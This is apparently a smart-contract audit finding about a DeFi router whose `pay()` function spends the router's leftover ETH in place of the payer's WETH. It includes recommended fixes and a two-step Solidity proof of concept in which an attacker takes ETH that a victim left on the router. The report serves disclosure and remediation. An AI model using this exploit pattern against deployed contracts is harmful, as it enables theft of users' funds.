### Title
Silent ETH-for-WETH Payment Substitution Allows Theft of Stranded Router ETH — (File: `metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` silently uses the router's entire native ETH balance to settle a WETH swap obligation instead of pulling from the designated `payer`. Any ETH left on the router from a prior `msg.value` call is consumed by the next caller who specifies WETH as `tokenIn`, letting that caller receive swap output without spending any of their own funds.

---

### Finding Description

`PeripheryPayments.pay()` contains a three-branch WETH path:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);   // ← payer never touched
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

When `nativeBalance >= value`, the function wraps the router's own ETH and transfers the resulting WETH to the pool. The `payer` argument — which is `msg.sender` of the originating swap call, stored in transient context — is **never consulted**. The function returns successfully without reverting, without pulling from the payer, and without any indication that the payment source changed. [2](#0-1) 

The router accumulates native ETH whenever a caller sends `msg.value` to a payable entry point (`multicall`, `exactInputSingle`, `exactOutputSingle`, `addLiquidityExactShares`, etc.) and the ETH is not fully consumed or refunded in the same transaction. The intended pattern is `multicall{value: X}([swap, refundETH()])`, but `refundETH` is optional and not enforced. [3](#0-2) 

`_justPayCallback` and the `tradesLeft == 0` branch of `_exactOutputIterateCallback` both call `pay(tokenToPay, payer, pool, amount)` where `payer` is the original `msg.sender` stored in transient storage. If `tokenToPay == WETH` and the router holds residual ETH, the router's ETH is consumed instead of the payer's WETH. [4](#0-3) 

The same `pay` function is shared by `MetricOmmPoolLiquidityAdder.metricOmmModifyLiquidityCallback`, so the same substitution applies to WETH-leg liquidity additions. [5](#0-4) 

---

### Impact Explanation

**Direct theft of user ETH.** An attacker who observes ETH stranded on the router can call `exactInputSingle` (or any WETH-input swap) with `amountIn` equal to the router's ETH balance. The router wraps and forwards that ETH to the pool, the attacker receives the full swap output, and the original depositor's ETH is permanently lost. No WETH approval or ETH `msg.value` is required from the attacker.

The loss is bounded only by the amount of ETH stranded on the router at the time of the attack, which can be arbitrarily large if a user sends a large `msg.value` without a `refundETH` step.

---

### Likelihood Explanation

**Medium.** The precondition — ETH stranded on the router — arises whenever a user:
- sends `msg.value > amountIn` to a WETH swap without a `refundETH` call in the same multicall, or
- has a multicall that partially reverts after ETH has been deposited but before `refundETH` executes.

Both patterns are realistic user errors and are explicitly acknowledged in the test suite (`test_multicall_ethInput_exactInputSingle_refundsUnusedEth` shows the correct pattern, implying the incorrect pattern is possible). [6](#0-5) 

An on-chain attacker can monitor the router's ETH balance and front-run or immediately follow any transaction that leaves ETH residue.

---

### Recommendation

In `pay`, when `payer != address(this)` and `token == WETH`, do not silently consume the router's shared native ETH balance. Two safe alternatives:

1. **Always pull from payer when `payer` is external.** Remove the native-ETH shortcut entirely for external payers; require callers to pre-wrap ETH into WETH before calling the router.

2. **Track per-call ETH attribution.** Store the `msg.value` of the current top-level call in transient storage and deduct only from that attributed amount, reverting if the attributed balance is insufficient. This preserves the ETH-input UX while preventing cross-user substitution.

---

### Proof of Concept

**Step 1 — Victim strands ETH on the router:**
```solidity
// Victim sends 5000 wei but only swaps 1000; omits refundETH
router.multicall{value: 5000}([
    abi.encodeCall(router.exactInputSingle, (ExactInputSingleParams({
        pool: wethToken1Pool,
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: 1000,
        amountOutMinimum: 0,
        recipient: victim,
        deadline: block.timestamp + 1,
        priceLimitX64: 0,
        extensionData: ""
    })))
]);
// router.balance == 4000 wei; victim lost 4000 wei
```

**Step 2 — Attacker steals the stranded ETH:**
```solidity
// Attacker has zero WETH approved and sends zero msg.value
// pay(WETH, attacker, pool, 4000): nativeBalance=4000 >= value=4000
// → router wraps its own 4000 ETH, sends WETH to pool
// → attacker receives token1 output, pays nothing
attacker.exactInputSingle(ExactInputSingleParams({
    pool: wethToken1Pool,
    tokenIn: address(weth),
    tokenOut: address(token1),
    zeroForOne: true,
    amountIn: 4000,          // matches router's residual ETH
    amountOutMinimum: 0,
    recipient: attacker,
    deadline: block.timestamp + 1,
    priceLimitX64: 0,
    extensionData: ""
}));
// attacker.token1 balance increased; router.balance == 0
// victim's 4000 wei is gone
```

The root cause is that `pay` reads `address(this).balance` — a shared, unauthenticated pool — and silently substitutes it for the designated payer's obligation without reverting or signalling the substitution. [7](#0-6)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L69-88)
```text
  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L172-177)
```text
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
